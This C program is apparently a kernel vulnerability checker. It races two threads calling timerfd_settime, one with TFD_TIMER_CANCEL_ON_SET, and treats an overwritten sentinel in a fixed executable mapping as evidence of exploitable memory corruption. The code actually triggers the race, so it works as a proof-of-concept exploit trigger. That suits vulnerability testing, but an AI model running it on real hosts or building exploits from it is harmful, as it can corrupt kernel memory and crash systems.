#define _GNU_SOURCE
#include <pthread.h>
#include <netinet/ip.h>
#include <sys/ioctl.h>
#include <sys/timerfd.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/timerfd.h>
#include <time.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include "idf.h"

#define FLAG_VALUE 0x20199012

struct itimerspec new_value;

void *competitor(void *param)
{
    while (1)
        timerfd_settime((int)param, TFD_TIMER_ABSTIME | TFD_TIMER_CANCEL_ON_SET, &new_value, NULL);
}

int check(int argc, char **argv)
{
    int fd;
    struct timespec now;

    char *holder_buf = (char *)mmap((void *)0x200000, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);

    *(int *)(holder_buf + 0x200) = FLAG_VALUE;

    if (clock_gettime(CLOCK_REALTIME, &now) == -1)
    {
        perror("clock_gettime");
        return ERROR;
    }

    new_value.it_value.tv_sec = now.tv_sec + 1;
    new_value.it_value.tv_nsec = now.tv_nsec;
    new_value.it_interval.tv_nsec = 0;

    fd = timerfd_create(CLOCK_REALTIME, TFD_NONBLOCK);
    if (fd == -1)
    {
        perror("clock_gettime");
        return ERROR;
    }

    int thread = 0;
    if (pthread_create(&thread, NULL, competitor, fd))
    {
        perror("pthread_create is error\n");
        return ERROR;
    }

    int try_cnt = 10000000, cnt = 0;
    while (cnt < try_cnt)
    {
        if (timerfd_settime(fd, TFD_TIMER_ABSTIME, &new_value, NULL) == -1)
            perror("timerfd_settime");

        if (*(int *)(holder_buf + 0x200) != (int)FLAG_VALUE)
            return VULNERABLE;

        cnt++;
    }

    return NOT_VULNERABLE;
}

int main(int argc, char *argv[])
{
    return check(argc, argv);
}